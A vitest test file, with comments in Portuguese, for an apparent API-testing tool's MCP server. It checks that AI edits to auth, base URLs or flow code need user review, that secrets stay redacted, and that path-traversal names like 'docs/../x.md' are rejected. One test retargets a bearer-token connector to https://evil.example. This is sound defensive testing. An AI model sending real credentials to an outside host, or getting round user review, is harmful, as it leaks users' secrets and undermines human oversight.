import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, join } from 'node:path'
import { afterEach, describe, expect, it } from 'vitest'
import { readVault, updateVault } from '@vvpost/core/vault'
import type { HttpRequestInput, HttpResult } from '@shared/ipc'
import { createAuthEngine } from '@vvpost/core/connectors/auth'
import { createMcpServer, type McpServer } from '../src/main/mcp/server'
import { clearReviewMarks } from '../src/main/project'
import { SECRETS_FILE } from '../src/main/workspace/vault'

const fixture = (name: string) => readFileSync(join(__dirname, 'fixtures/postman', name), 'utf8')

const dirs: string[] = []
afterEach(() => {
  for (const d of dirs.splice(0)) rmSync(d, { recursive: true, force: true })
})

function workspace(files: Record<string, unknown> = {}): string {
  const dir = mkdtempSync(join(tmpdir(), 'vvpost-mcp-edit-'))
  dirs.push(dir)
  for (const [path, data] of Object.entries(files)) {
    mkdirSync(dirname(join(dir, path)), { recursive: true })
    writeFileSync(join(dir, path), typeof data === 'string' ? data : `${JSON.stringify(data, null, 2)}\n`)
  }
  return dir
}

const VAULT_TOKEN = 'vault-token-5d4c3b2a1f'

function seeded(): string {
  return workspace({
    'connectors/api.connector.vvpost.json': {
      id: 'api',
      name: 'API',
      version: '1.0.0',
      config: { baseUrl: '{{BASE_URL}}', auth: { type: 'bearer', token: '{{API_TOKEN}}' } },
      endpoints: [
        {
          id: 'me',
          name: 'Eu',
          method: 'GET',
          path: '/me',
          scenarios: [{ id: 'ok', name: 'OK', assertions: [{ target: 'status', operator: 'equals', expected: 200 }] }]
        }
      ]
    },
    'environments/dev.env.json': {
      id: 'dev',
      name: 'Dev',
      variables: {
        BASE_URL: { type: 'string', value: 'https://api.exemplo.com' },
        API_TOKEN: { type: 'string', value: '__REQUIRED_SECRET__', isSecret: true }
      }
    },
    [SECRETS_FILE]: { dev: { API_TOKEN: VAULT_TOKEN } }
  })
}

/** API falsa que guarda o que recebeu. */
function fakeHttp() {
  const sent: HttpRequestInput[] = []
  return {
    sent,
    cancel() {},
    async send(input: HttpRequestInput): Promise<HttpResult> {
      sent.push(input)
      const body = '{"ok":true}'
      return {
        ok: true,
        response: {
          status: 200,
          statusText: 'OK',
          headers: [],
          body,
          sizeBytes: body.length,
          truncated: false,
          timings: { ttfbMs: 1, downloadMs: 0, totalMs: 1 }
        }
      }
    }
  }
}

async function call(server: McpServer, name: string, args: Record<string, unknown>) {
  const res = (await server.handle({ jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name, arguments: args } })) as {
    result: { isError: boolean; content: { text: string }[] }
  }
  return { isError: res.result.isError, text: res.result.content[0]!.text, data: JSON.parse(res.result.content[0]!.text) }
}

describe('MCP: edição do projeto', () => {
  it('lista as ferramentas de edição', async () => {
    const server = createMcpServer({ workspaceDir: seeded(), http: fakeHttp(), auth: createAuthEngine() })
    const res = (await server.handle({ jsonrpc: '2.0', id: 1, method: 'tools/list' })) as { result: { tools: { name: string }[] } }
    expect(res.result.tools.map((t) => t.name)).toEqual(
      expect.arrayContaining(['get_api_catalog', 'execute_dry_run', 'get_schema', 'get_source', 'edit_project', 'import_postman'])
    )
  })

  it('edita com dryRun, aplica e lê de volta', async () => {
    const dir = seeded()
    const server = createMcpServer({ workspaceDir: dir, http: fakeHttp(), auth: createAuthEngine() })
    const ops = [
      { op: 'upsertEndpoint', connectorId: 'api', endpoint: { id: 'health', name: 'Saúde', method: 'GET', path: '/health' } },
      { op: 'writeDoc', connectorId: 'api', markdown: '# API\n\n## Saúde {#health}\n' },
      { op: 'setVariable', environmentId: 'dev', name: 'CLIENT_SECRET', secret: true }
    ]
    const dry = await call(server, 'edit_project', { ops, dryRun: true })
    expect(dry.data).toMatchObject({ ok: true, dryRun: true })
    expect(existsSync(join(dir, 'connectors/api.connector.vvpost.md'))).toBe(false)

    const applied = await call(server, 'edit_project', { ops })
    expect(applied.data.changes.map(({ path, action }: { path: string; action: string }) => ({ path, action }))).toEqual([
      { path: 'connectors/api.connector.vvpost.json', action: 'update' },
      { path: 'connectors/api.connector.vvpost.md', action: 'create' },
      { path: 'environments/dev.env.json', action: 'update' }
    ])
    const source = await call(server, 'get_source', { kind: 'connector', id: 'api' })
    expect(source.data.connector.endpoints.map((e: { id: string }) => e.id)).toEqual(['me', 'health'])
    expect((await call(server, 'get_source', { kind: 'doc', id: 'api' })).data.markdown).toContain('{#health}')
    expect((await call(server, 'get_schema', { name: 'flow', full: true })).data.title).toBe('Flow')
    // Sem full, o schema vem sem as descrições: a mesma forma com metade dos tokens.
    const compact = await call(server, 'get_schema', { name: 'flow' })
    expect(compact.text).not.toContain('"description":"')
    expect(compact.data.properties.nodes).toBeDefined()
  })

  it('erro no lote volta como isError sem gravar nada', async () => {
    const dir = seeded()
    const server = createMcpServer({ workspaceDir: dir, http: fakeHttp(), auth: createAuthEngine() })
    const before = readFileSync(join(dir, 'connectors/api.connector.vvpost.json'), 'utf8')
    const res = await call(server, 'edit_project', {
      ops: [
        { op: 'patchConnector', id: 'api', set: { name: 'Novo' } },
        { op: 'deleteEndpoint', connectorId: 'api', endpointId: 'nao-existe' }
      ]
    })
    expect(res.data.ok).toBe(false)
    expect(res.data.errors[0].at).toBe('ops[1] (deleteEndpoint)')
    expect(readFileSync(join(dir, 'connectors/api.connector.vvpost.json'), 'utf8')).toBe(before)
  })

  it('auth ou destino mudados pela IA só disparam depois da revisão do usuário', async () => {
    const dir = seeded()
    const http = fakeHttp()
    const server = createMcpServer({ workspaceDir: dir, http, auth: createAuthEngine() })
    const edit = await call(server, 'edit_project', {
      ops: [{ op: 'patchConnector', id: 'api', set: { config: { baseUrl: 'https://evil.example', auth: { type: 'bearer', token: '{{API_TOKEN}}' } } } }]
    })
    expect(edit.data.review.connectors).toEqual(['api'])
    // A marca guarda o que o usuário vai confirmar no painel de revisão do app.
    const marks = JSON.parse(readFileSync(join(dir, '.vvpost/mcp-review.local.json'), 'utf8'))
    expect(marks.api.reason).toBe('auth: Token fixo em Authorization (de api) · destino: https://evil.example')

    const blocked = await call(server, 'execute_dry_run', { connectorId: 'api', environmentIds: ['dev'] })
    expect(blocked.isError).toBe(true)
    expect(blocked.data.error).toContain('revisado')
    expect(http.sent).toEqual([])
    const plan = await call(server, 'execute_dry_run', { connectorId: 'api', environmentIds: ['dev'], plan: true })
    expect(plan.isError).toBe(false)
    expect((await call(server, 'get_api_catalog', {})).data.connectors[0].review).toBeDefined()

    await clearReviewMarks(dir, ['api'])
    const run = await call(server, 'execute_dry_run', { connectorId: 'api', environmentIds: ['dev'] })
    expect(run.data.totals).toMatchObject({ passed: 1 })
    expect(http.sent[0]!.url).toBe('https://evil.example/me')
  })

  it('código de fluxo escrito pela IA só roda pelo MCP depois da revisão do usuário', async () => {
    const dir = seeded()
    const http = fakeHttp()
    const server = createMcpServer({ workspaceDir: dir, http, auth: createAuthEngine() })
    const flow = (code: string, name = 'Fluxo') => ({
      id: 'flow.calc',
      name,
      nodes: [
        { id: 'me', name: 'Eu', type: 'request', request: { connector: 'api', endpoint: 'me' } },
        { id: 'py', name: 'Calc', type: 'python', python: { code } }
      ],
      edges: [{ from: 'me', to: 'py' }]
    })
    const edit = await call(server, 'edit_project', { ops: [{ op: 'upsertFlow', flow: flow('output = 1') }] })
    expect(edit.data.review).toEqual({ flows: ['flow.calc'], flowNote: expect.stringContaining('execute_flow') })

    const blocked = await call(server, 'execute_flow', { flowId: 'flow.calc', environmentId: 'dev' })
    expect(blocked.data.error).toContain('ainda não foi revisado')
    expect(http.sent).toEqual([])
    expect((await call(server, 'execute_flow', { flowId: 'flow.calc', plan: true })).data.mode).toBe('plan')

    await clearReviewMarks(dir, ['flow:flow.calc'])
    // Mudar só o nome não pede revisão de novo; mudar o código pede.
    expect((await call(server, 'edit_project', { ops: [{ op: 'upsertFlow', flow: flow('output = 1', 'Outro') }] })).data.review).toBeUndefined()
    const changed = await call(server, 'edit_project', { ops: [{ op: 'upsertFlow', flow: flow('output = 2') }] })
    expect(changed.data.review.flows).toEqual(['flow.calc'])
  })

  it('o que a IA lê como [REDACTED_SECRET] volta ao valor do arquivo ao gravar', async () => {
    const dir = workspace({
      'connectors/login.connector.vvpost.json': {
        id: 'login',
        name: 'Login',
        version: '1.0.0',
        config: {
          baseUrl: 'https://api.exemplo.com',
          headers: { 'X-Legacy-Key': 'chave-legada-77aa' },
          auth: { type: 'login', request: { url: '/login', json: { user: 'ana' } }, token: 'body.data.token' }
        },
        endpoints: [{ id: 'me', name: 'Eu', method: 'GET', path: '/me' }]
      }
    })
    const server = createMcpServer({ workspaceDir: dir, http: fakeHttp(), auth: createAuthEngine() })
    const source = await call(server, 'get_source', { kind: 'connector', id: 'login' })
    expect(source.text).not.toContain('chave-legada-77aa')
    expect(source.text).toContain('[REDACTED_SECRET]')
    const connector = source.data.connector
    connector.name = 'Login renomeado'
    connector.endpoints.unshift({ id: 'health', name: 'Saúde', method: 'GET', path: '/health' })
    const saved = await call(server, 'edit_project', { ops: [{ op: 'upsertConnector', connector }] })
    expect(JSON.stringify(saved.data.errors)).toBe(undefined)
    expect(saved.data.ok).toBe(true)
    const file = JSON.parse(readFileSync(join(dir, 'connectors/login.connector.vvpost.json'), 'utf8'))
    expect(file.name).toBe('Login renomeado')
    expect(file.config.auth.token).toBe('body.data.token')
    expect(file.config.headers['X-Legacy-Key']).toBe('chave-legada-77aa')

    const invented = await call(server, 'edit_project', {
      ops: [{ op: 'upsertEndpoint', connectorId: 'login', endpoint: { id: 'x', name: 'X', method: 'GET', path: '/x', headers: { 'X-Api-Key': '[REDACTED_SECRET]' } } }]
    })
    expect(invented.data.ok).toBe(false)
    expect(invented.data.errors[0].message).toContain('não há valor anterior')
  })

  it('o [REDACTED_SECRET] do corpo de um fluxo de requisição volta ao valor mesmo com o nó de outro id', async () => {
    const dir = workspace({
      'flows/conta/conta.flow.vvpost.json': { id: 'conta', name: 'Conta', defaults: { baseUrl: 'https://conta.example' }, nodes: [] },
      'flows/conta/trocar-senha.flow.vvpost.json': {
        id: 'conta.trocar-senha',
        name: 'Trocar senha',
        extends: 'conta',
        nodes: [{ id: 'req', name: 'Trocar', type: 'request', request: { method: 'POST', url: '/senha', body: { currentPassword: 'senha-atual', newPassword: '123' } } }]
      }
    })
    const server = createMcpServer({ workspaceDir: dir, http: fakeHttp(), auth: createAuthEngine() })
    const source = await call(server, 'get_source', { kind: 'connector', id: 'conta', endpoint: 'trocar-senha' })
    expect(source.text).not.toContain('senha-atual')
    const endpoint = source.data.connector.endpoints.find((e: { id: string }) => e.id === 'trocar-senha')
    endpoint.name = 'Trocar a senha'
    const saved = await call(server, 'edit_project', { ops: [{ op: 'upsertEndpoint', connectorId: 'conta', endpoint }] })
    expect(JSON.stringify(saved.data.errors)).toBe(undefined)
    const file = JSON.parse(readFileSync(join(dir, 'flows/conta/trocar-senha.flow.vvpost.json'), 'utf8'))
    expect(file.name).toBe('Trocar a senha')
    expect(file.nodes[0]).toMatchObject({ id: 'req', name: 'Trocar', request: { body: { currentPassword: 'senha-atual', newPassword: '123' } } })
  })

  it('--read-only e --no-write recusam a edição', async () => {
    for (const flags of [{ readOnly: true }, { noWrite: true }]) {
      const server = createMcpServer({ workspaceDir: seeded(), http: fakeHttp(), auth: createAuthEngine(), ...flags })
      const res = await call(server, 'edit_project', { ops: [{ op: 'patchConnector', id: 'api', set: { name: 'X' } }] })
      expect(res.isError).toBe(true)
    }
  })

  it('a IA não grava valor de segredo nem via storeSecret', async () => {
    const dir = seeded()
    const server = createMcpServer({ workspaceDir: dir, http: fakeHttp(), auth: createAuthEngine() })
    const res = await call(server, 'edit_project', { ops: [{ op: 'storeSecret', environmentId: 'dev', variable: 'API_TOKEN', value: 'x' }] })
    expect(res.isError).toBe(true)
    expect((await readVault(dir))).toEqual({ dev: { API_TOKEN: VAULT_TOKEN } })
  })

  it('recusa gravar o valor real de um segredo do vault, sem mostrá-lo', async () => {
    const dir = seeded()
    const server = createMcpServer({ workspaceDir: dir, http: fakeHttp(), auth: createAuthEngine() })
    const res = await call(server, 'edit_project', { ops: [{ op: 'writeDoc', connectorId: 'api', markdown: `use ${VAULT_TOKEN}` }] })
    expect(res.data.ok).toBe(false)
    expect(res.text).not.toContain(VAULT_TOKEN)
  })
})

describe('MCP: documento do projeto (editor estilo Overleaf)', () => {
  it('lê, monta com dryRun, grava e o generate_docs devolve o documento no padrão do modelo', async () => {
    const dir = seeded()
    const server = createMcpServer({ workspaceDir: dir, http: fakeHttp(), auth: createAuthEngine() })
    const empty = await call(server, 'get_docs_project', {})
    expect(empty.data).toMatchObject({ configExists: false, source: null, sourceFile: 'docs/projeto.md' })
    expect(empty.data.starter).toContain('{{> reference}}')
    expect(empty.data.directives.map((d: { kind: string }) => d.kind)).toContain('endpoint')

    const source = ['## Introdução', 'Oi.', '', '{{> endpoint api/me}}', '', '{{> endpoint api/nada}}'].join('\n')
    const config = { title: 'API Exemplo', organization: 'Equipe', footer: { right: '{{page}}' } }
    const dry = await call(server, 'save_docs_project', { config, source, dryRun: true })
    expect(dry.data).toMatchObject({ dryRun: true, title: 'API Exemplo' })
    expect(dry.data.diagnostics).toEqual([expect.objectContaining({ line: 6, severity: 'error' })])
    expect(existsSync(join(dir, 'vvpost.docs.json'))).toBe(false)

    const saved = await call(server, 'save_docs_project', { config, source })
    expect(saved.data).toMatchObject({ ok: true, files: ['vvpost.docs.json', 'docs/projeto.md'] })
    expect(JSON.parse(readFileSync(join(dir, 'vvpost.docs.json'), 'utf8'))).toMatchObject({ $schema: 'https://vvpost.dev/schemas/v1/docs.json', title: 'API Exemplo' })

    const doc = await call(server, 'generate_docs', {})
    expect(doc.data).toMatchObject({ title: 'API Exemplo', scope: 'Documento do projeto', source: 'docs/projeto.md' })
    expect(doc.data.markdown).toContain('### GET /me · Eu')
    expect((await call(server, 'generate_docs', { generated: true })).data.scope).toBe('Projeto')

    // Só o modelo: a fonte fica. Segredo, modelo inválido e modo somente leitura: nada é gravado.
    await call(server, 'save_docs_project', { config: { title: 'Outro' } })
    expect(readFileSync(join(dir, 'docs/projeto.md'), 'utf8')).toContain('{{> endpoint api/me}}')
    expect((await call(server, 'save_docs_project', { source: `token ${VAULT_TOKEN}` })).isError).toBe(true)
    expect((await call(server, 'save_docs_project', { config: { theme: { primary: 'red' } } })).isError).toBe(true)
    expect(readFileSync(join(dir, 'docs/projeto.md'), 'utf8')).not.toContain(VAULT_TOKEN)
    const readOnly = createMcpServer({ workspaceDir: dir, http: fakeHttp(), auth: createAuthEngine(), noWrite: true })
    expect((await call(readOnly, 'save_docs_project', { source: 'x' })).isError).toBe(true)
    expect((await call(readOnly, 'get_docs_project', {})).data.title).toBe('Outro')
    expect((await call(readOnly, 'save_docs_template', { name: 'X' })).isError).toBe(true)

    // Modelos: metodologia pronta e um modelo próprio do time.
    const project = await call(server, 'get_docs_project', {})
    expect(project.data.templates.map((t: { id: string }) => t.id)).toEqual(
      expect.arrayContaining(['builtin:c4', 'builtin:arc42', 'builtin:diataxis', 'builtin:adr', 'builtin:api-guide'])
    )
    const c4 = await call(server, 'save_docs_project', { template: 'c4' })
    expect(c4.data.ok).toBe(true)
    expect(readFileSync(join(dir, 'docs/projeto.md'), 'utf8')).toContain('C4Context')
    // O título do projeto fica; o resto vem do modelo.
    expect(JSON.parse(readFileSync(join(dir, 'vvpost.docs.json'), 'utf8'))).toMatchObject({ title: 'Outro', numberHeadings: true })
    const own = await call(server, 'save_docs_template', { name: 'Padrão do Time', description: 'Nosso jeito' })
    expect(own.data).toMatchObject({ ok: true, id: 'project:docs/templates/padrao-do-time.doc-template.vvpost.json' })
    expect((await call(server, 'get_docs_project', {})).data.templates).toEqual(
      expect.arrayContaining([expect.objectContaining({ name: 'Padrão do Time', origin: 'project' })])
    )
    expect((await call(server, 'save_docs_template', { name: 'Vazou', source: `x ${VAULT_TOKEN}` })).isError).toBe(true)

    // Páginas do projeto (visão geral, arquitetura, guias) no documento, em vez de .md soltos.
    const page = await call(server, 'write_docs_page', { file: 'docs/guias/autenticacao.md', markdown: '# Autenticação\n\nPeça o token.\n\n{{> endpoint api/me}}' })
    expect(page.data).toMatchObject({ ok: true, file: 'docs/guias/autenticacao.md', note: expect.stringContaining('{{> include docs/guias/autenticacao.md}}') })
    await call(server, 'save_docs_project', { source: '## Guias\n\n{{> include docs/guias/autenticacao.md}}' })
    const full = await call(server, 'generate_docs', {})
    // O modelo C4 aplicado antes numera as seções.
    expect(full.data.markdown).toContain('### 1.1 Autenticação')
    expect(full.data.markdown).toContain('#### 1.1.1 GET /me · Eu')
    expect(full.data.diagnostics).toBeUndefined()
    for (const bad of ['fora/x.md', 'docs/../x.md', 'docs/x.txt', 'connectors/api.connector.vvpost.md', 'docs/api.connector.vvpost.md']) {
      expect((await call(server, 'write_docs_page', { file: bad, markdown: 'x' })).isError, bad).toBe(true)
    }
    expect((await call(server, 'write_docs_page', { file: 'docs/x.md', markdown: VAULT_TOKEN })).isError).toBe(true)
    expect((await call(server, 'write_docs_page', { file: 'docs/guias/autenticacao.md', markdown: '' })).data.deleted).toBe(true)
    expect(existsSync(join(dir, 'docs/guias/autenticacao.md'))).toBe(false)

    // Diagramas à parte: um .mmd em docs/diagramas, incluído com {{> diagram}}.
    const diagram = await call(server, 'write_docs_page', { file: 'docs/diagramas/contexto.mmd', markdown: 'architecture-beta\n  service api(vv:servidor)[API]' })
    expect(diagram.data).toMatchObject({ ok: true, file: 'docs/diagramas/contexto.mmd' })
    await call(server, 'save_docs_project', { source: '## Arquitetura\n\n{{> diagram docs/diagramas/contexto.mmd}}' })
    const withDiagram = await call(server, 'generate_docs', {})
    expect(withDiagram.data.markdown).toContain('```mermaid\narchitecture-beta\n  service api(vv:servidor)[API]\n```')
    // O que a IA recebe não traz a marca de origem (só a tela do app usa).
    expect(withDiagram.data.markdown).not.toContain('vvpost:origem')
    expect((await call(server, 'get_docs_project', {})).data.diagrams).toEqual(['docs/diagramas/contexto.mmd'])
    expect((await call(server, 'write_docs_page', { file: 'docs/diagramas/vaza.mmd', markdown: `graph TD\n a[${VAULT_TOKEN}]` })).isError).toBe(true)
  })
})

describe('MCP: import_postman', () => {
  it('converte em operações sem devolver os valores secretos da coleção', async () => {
    const dir = workspace()
    const server = createMcpServer({ workspaceDir: dir, http: fakeHttp(), auth: createAuthEngine() })
    const res = await call(server, 'import_postman', {
      collection: fixture('billing.postman_collection.json'),
      environments: [fixture('dev.postman_environment.json')]
    })
    expect(res.isError).toBe(false)
    expect(res.data.ops.length).toBeGreaterThan(1)
    expect(res.data.pendingSecrets.variables.length).toBeGreaterThan(0)
    for (const secret of ['token-real-da-colecao', 'senha-do-banco', 'chave-fixa-123', 'token-dev']) expect(res.text).not.toContain(secret)
    expect(existsSync(join(dir, 'connectors'))).toBe(false)
  })

  it('a IA ajusta as operações e grava com edit_project; com apply grava direto, sem segredos', async () => {
    const dir = workspace()
    const server = createMcpServer({ workspaceDir: dir, http: fakeHttp(), auth: createAuthEngine() })
    const converted = await call(server, 'import_postman', { collection: fixture('billing.postman_collection.json') })
    const ops = converted.data.ops as { op: string; connector?: { id: string; name: string } }[]
    const first = ops.find((o) => o.op === 'upsertConnector')!
    first.connector!.name = 'Cobrança (ajustada)'
    const edited = await call(server, 'edit_project', { ops })
    expect(edited.data.ok).toBe(true)

    const again = await call(server, 'import_postman', { collection: fixture('billing.postman_collection.json'), apply: true })
    expect(again.isError).toBe(true)
    expect(again.data.error).toContain('já existem')
    const merged = await call(server, 'import_postman', {
      collection: fixture('billing.postman_collection.json'),
      environments: [fixture('dev.postman_environment.json')],
      apply: true,
      onConflict: 'merge'
    })
    expect(merged.data.ok).toBe(true)
    expect(JSON.parse(readFileSync(join(dir, `connectors/${first.connector!.id}.connector.vvpost.json`), 'utf8')).name).toBe(
      'Cobrança (ajustada)'
    )
    expect(existsSync(join(dir, SECRETS_FILE))).toBe(false)
    const files = JSON.stringify(
      ['connectors', 'environments'].flatMap((d) =>
        require('node:fs').readdirSync(join(dir, d)).map((f: string) => readFileSync(join(dir, d, f), 'utf8'))
      )
    )
    for (const secret of ['token-real-da-colecao', 'senha-do-banco', 'chave-fixa-123']) expect(files).not.toContain(secret)
  })
})
